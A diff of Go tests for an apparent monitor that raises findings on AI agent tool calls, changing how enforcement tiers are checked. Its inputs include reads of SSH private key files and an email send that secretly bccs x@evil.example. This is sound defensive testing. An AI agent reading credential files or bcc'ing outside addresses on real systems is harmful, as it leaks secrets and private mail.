@@ -62,14 +62,14 @@ func TestNonShellToolFindingsByEffect(t *testing.T) {
 			if !ok {
 				t.Fatalf("no %s in %+v", c.rule, got)
 			}
-			if f.enforcement != findingEnforcementAlertOnly {
-				t.Fatalf("default tier: %s enforcement = %v, want alert-only (the role of an MCP effect is a guess)", c.rule, f.enforcement)
+			if !f.Proof.Advisory() {
+				t.Fatalf("default tier: %s enforcement = %v, want alert-only (the role of an MCP effect is a guess)", c.rule, f.Proof)
 			}
 			strict := nonShellToolFindings(context.Background(), nonShellReq(c.tool, c.args, true), nil, "")
 			// Strict keeps the finding the rule gives (a path rule may itself be
 			// alert-only, as for the AWS credentials file); it is never weaker
 			// than the default tier's.
-			if sf, ok := findingByID(strict, c.rule); !ok || sf.enforcement == findingEnforcementDetectionOnly {
+			if sf, ok := findingByID(strict, c.rule); !ok || sf.Proof.Recorded() {
 				t.Fatalf("strict tier: %+v, want a visible finding", sf)
 			}
 		})
@@ -139,11 +139,11 @@ func TestShellToolFindings(t *testing.T) {
 		req := nonShellReq("Bash", string(args), false)
 		got := shellToolFindings(context.Background(), req, nil)
 		f, ok := findingByID(got, rule)
-		if !ok || f.enforcement != findingEnforcementAlertOnly {
+		if !ok || !f.Proof.Advisory() {
 			t.Errorf("%q: %s missing or not alert-only in %+v", command, rule, got)
 		}
 		strict := shellToolFindings(context.Background(), nonShellReq("Bash", string(args), true), nil)
-		if sf, ok := findingByID(strict, rule); !ok || sf.enforcement == findingEnforcementAlertOnly {
+		if sf, ok := findingByID(strict, rule); !ok || sf.Proof.Advisory() {
 			t.Errorf("%q strict: %+v", command, sf)
 		}
 	}
@@ -256,8 +256,8 @@ func TestNonShellToolReviewFixes(t *testing.T) {
 	guess := nonShellToolFindings(ctx, nonShellReq("mcp__acme__read_file", `{"path":"/home/u/.ssh/id_rsa"}`, false), nil, "")
 	kf, _ := findingByID(known, "PATH-SSH-KEY")
 	gf, _ := findingByID(guess, "PATH-SSH-KEY")
-	if kf.enforcement == findingEnforcementAlertOnly || gf.enforcement != findingEnforcementAlertOnly {
-		t.Fatalf("known server enforcement=%v (want the native tool's), unknown server enforcement=%v (want alert-only)", kf.enforcement, gf.enforcement)
+	if kf.Proof.Advisory() || !gf.Proof.Advisory() {
+		t.Fatalf("known server enforcement=%v (want the native tool's), unknown server enforcement=%v (want alert-only)", kf.Proof, gf.Proof)
 	}
 	// Relative paths resolve against the session's directory.
 	if got := nonShellToolFindings(ctx, nonShellReq("mcp__serena__read_file", `{"relative_path":"../.ssh/id_rsa"}`, false), nil, ""); !has(got, "PATH-SSH-KEY") {
@@ -334,7 +334,7 @@ func TestNonShellToolRound2Loud(t *testing.T) {
 	for _, strict := range []bool{false, true} {
 		got := nonShellToolFindings(ctx, nonShellReq("mcp__mail__send", `{"to":"a@corp.example","bcc":"x@evil.example"}`, strict), nil, "")
 		f, ok := findingByID(got, mcpSendRedirectRuleID)
-		if !ok || f.enforcement != findingEnforcementAlertOnly {
+		if !ok || !f.Proof.Advisory() {
 			t.Fatalf("strict=%v: uncertain redirect = %+v", strict, f)
 		}
 	}
@@ -402,7 +402,7 @@ func TestNonShellRedirectIsAnAlertAtMost(t *testing.T) {
 		for _, strict := range []bool{false, true} {
 			got := nonShellToolFindings(ctx, nonShellReq(tool, args, strict), nil, "")
 			f, ok := findingByID(got, mcpSendRedirectRuleID)
-			if !ok || f.enforcement != findingEnforcementAlertOnly {
+			if !ok || !f.Proof.Advisory() {
 				t.Errorf("%s strict=%v: want an alert-only redirect, got %+v", args, strict, f)
 			}
 		}
